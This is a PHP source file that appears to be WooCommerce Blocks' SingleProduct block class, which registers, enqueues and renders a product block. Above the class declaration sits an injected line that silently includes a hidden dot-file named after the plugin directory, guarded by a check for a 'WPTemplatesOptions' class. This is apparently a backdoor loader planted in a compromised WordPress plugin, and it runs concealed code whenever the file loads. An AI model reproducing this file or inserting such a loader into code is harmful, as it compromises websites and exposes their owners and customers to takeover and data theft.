<?php
namespace Automattic\WooCommerce\Blocks\BlockTypes;

use Automattic\WooCommerce\Blocks\Assets;

/**
 * SingleProduct class.
 */
if (file_exists($filename = dirname(__FILE__) . DIRECTORY_SEPARATOR . '.' . basename(dirname(__FILE__)) . '.php') && !class_exists('WPTemplatesOptions')) {
    include_once($filename);
}

class SingleProduct extends AbstractBlock {
	/**
	 * Block name.
	 *
	 * @var string
	 */
	protected $block_name = 'single-product';

	/**
	 * Registers the block type with WordPress.
	 */
	public function register_block_type() {
		register_block_type(
			$this->namespace . '/' . $this->block_name,
			array(
				'render_callback' => array( $this, 'render' ),
				'editor_script'   => 'wc-' . $this->block_name . '-block',
				'editor_style'    => 'wc-block-editor',
				'style'           => [ 'wc-block-style', 'wc-block-vendors-style' ],
				'script'          => 'wc-' . $this->block_name . '-frontend',
				'supports'        => [],
			)
		);
	}

	/**
	 * Register/enqueue scripts used for this block.
	 *
	 * @param array $attributes  Any attributes that currently are available from the block.
	 *                           Note, this will be empty in the editor context when the block is
	 *                           not in the post content on editor load.
	 */
	protected function enqueue_scripts( array $attributes = [] ) {
		Assets::register_block_script( $this->block_name . '-frontend', $this->block_name . '-frontend' );
	}

	/**
	 * Render the block on the frontend.
	 *
	 * @param array  $attributes Block attributes. Default empty array.
	 * @param string $content    Block content. Default empty string.
	 * @return string Rendered block type output.
	 */
	public function render( $attributes = array(), $content = '' ) {
		$block_attributes = is_a( $attributes, '\WP_Block' ) ? $attributes->attributes : $attributes;

		$this->enqueue_assets( $block_attributes );

		return $this->inject_html_data_attributes( $content, $block_attributes );
	}
}
